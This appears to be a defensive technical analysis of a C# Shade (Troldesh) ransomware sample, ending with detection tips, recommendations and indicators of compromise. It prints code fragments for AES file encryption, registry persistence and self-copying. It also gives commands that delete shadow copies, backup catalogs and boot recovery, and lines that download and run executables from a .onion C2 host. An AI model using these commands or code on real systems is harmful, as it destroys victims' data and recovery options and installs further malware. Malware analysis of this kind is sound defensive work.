
# 🧨 Shade Ransomware – Technical Analysis

## Introduction

This sample, written in **C#**, corresponds to a variant of the **Shade ransomware**, also known as **Troldesh**. It performs **AES encryption** on user files, alters the **desktop wallpaper**, adds **persistence**, and connects to a **C2 server via Tor**.

Key elements of the code:
- Language: **C#**
- Framework: Uses standard .NET and Windows APIs
- Obfuscation: None present in this version (symbols are readable)
- Persistence: Registry autorun entry
- Exfiltration/C2: Attempts to download tools via `.onion` links

## Comportement général

Upon execution, this ransomware:
1. Generates an AES key/IV.
2. Encrypts a predefined list of file types on the system.
3. Drops ransom notes (`README*.txt`).
4. Downloads executables from a TOR `.onion` C2.
5. Deletes shadow copies to prevent recovery.
6. Sets an image (if URL passed) as wallpaper.
7. Copies itself to `ProgramData\Drivers` and adds a registry autostart entry.

## Analyse technique

### 🔐 Function: AES Key & RSA Public Key Initialization
```csharp
_aesKey = new byte[32];
_aesIv = new byte[16];
RandomNumberGenerator.Create().GetBytes(_aesKey);
RandomNumberGenerator.Create().GetBytes(_aesIv);

RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048);
rsa.FromXmlString("<RSAKeyValue>...</RSAKeyValue>");
```

Initializes a random **AES key and IV** using `RandomNumberGenerator`. The public key (RSA 2048) is hardcoded for encrypting the AES key (although not used directly in this snippet).

### 📂 Function: EncryptFiles
```csharp
string[] files = Directory.GetFiles(dir);
foreach (string file in files) {
    if (!file.EndsWith(".shade")) EncryptFile(file, extensions);
}
```

Recursively traverses directories to encrypt files **not already encrypted**.

### 🔐 Function: EncryptFile
```csharp
AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
aes.Key = _aesKey;
aes.IV = _aesIv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
File.WriteAllBytes(file + ".shade", encrypted);
File.Delete(file);
```

Encrypts file using **AES CBC**. Deletes original and saves `.shade` version.

### 📝 Function: CreateREADMEFiles
```csharp
File.WriteAllText(path, "Ваши файлы были зашифрованы...");
```

Drops ransom notes with Russian message on desktop.

### 🧬 Function: AddAutostartEntry
```csharp
Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Client Server Runtime Subsystem", value);
```

Sets registry key to persist on reboot.

### 📁 Function: CopySelf
```csharp
File.Copy(Environment.GetCommandLineArgs()[0], "C:\ProgramData\Drivers\<filename>");
```

Copies executable to hidden location.

### 🔄 Function: DeleteShadowCopies
```cmd
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
```

Deletes recovery options using command-line tools.

### 🌐 Function: ConnectToServer
```csharp
webClient.DownloadFile("gxyvmhc55s4fss2q.onion/reg***", "Reg***.exe");
...
Process.Start("Reg***.exe");
```

Attempts to download other malware payloads from TOR `.onion` server.

### 🖼️ Function: ManageWallpaper
```csharp
webClient.DownloadFile(bmpUrl, filePath);
SystemParametersInfo(20, 0, filePath, 3);
```

Changes desktop wallpaper to downloaded image.

## Techniques utilisées 🛠️

### ✅ Persistance
```csharp
Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run").SetValue("Client Server Runtime Subsystem", path);
```

### ✅ Chiffrement AES + Extension personnalisée
```csharp
File.WriteAllBytes(file + ".shade", bytes);
```

### ✅ Suppression de sauvegardes système
```cmd
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
```

### ✅ C2 via .onion
```csharp
webClient.DownloadFile("gxyvmhc55s4fss2q.onion/reg***", "Reg***.exe");
webClient.DownloadFile("gxyvmhc55s4fss2q.onion/prog***", "Prog***.exe");
webClient.DownloadFile("gxyvmhc55s4fss2q.onion/err***", "Err***.exe");
webClient.DownloadFile("gxyvmhc55s4fss2q.onion/cmd***", "Cmd***.exe");
webClient.DownloadFile("gxyvmhc55s4fss2q.onion/sys**", "Sys**1.exe");
```

### ✅ Auto-replication
```csharp
File.Copy(currentExe, targetPath);
```

## Conclusion ✅

This ransomware demonstrates classical **file locker techniques** with robust AES encryption, system modification, and network-based payload retrieval. Its **lack of obfuscation** and **hardcoded RSA key** suggests it's either a development version or a previously public variant.

🔍 **Detection Tips**:
- Look for `.shade` file extensions.
- Monitor access to registry autorun paths.
- Detect use of `vssadmin` and `wbadmin` commands.

### 🛡️ Recommendations:
- Restore from backups (if still available)
- Use endpoint protection to detect malicious registry writes
- Block outbound `.onion` traffic using a proxy or firewall

## Indicateurs (IOCs) 🧾

- **Filenames Created:** `README1.txt` to `README10.txt`
- **Registry Key:** `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Client Server Runtime Subsystem`
- **Self-Copy Location:** `C:\ProgramData\Drivers\csrss.exe`
- **C2 URLs (.onion):** `gxyvmhc55s4fss2q.onion/reg***`, etc.
- **File Extension Used:** `.shade`
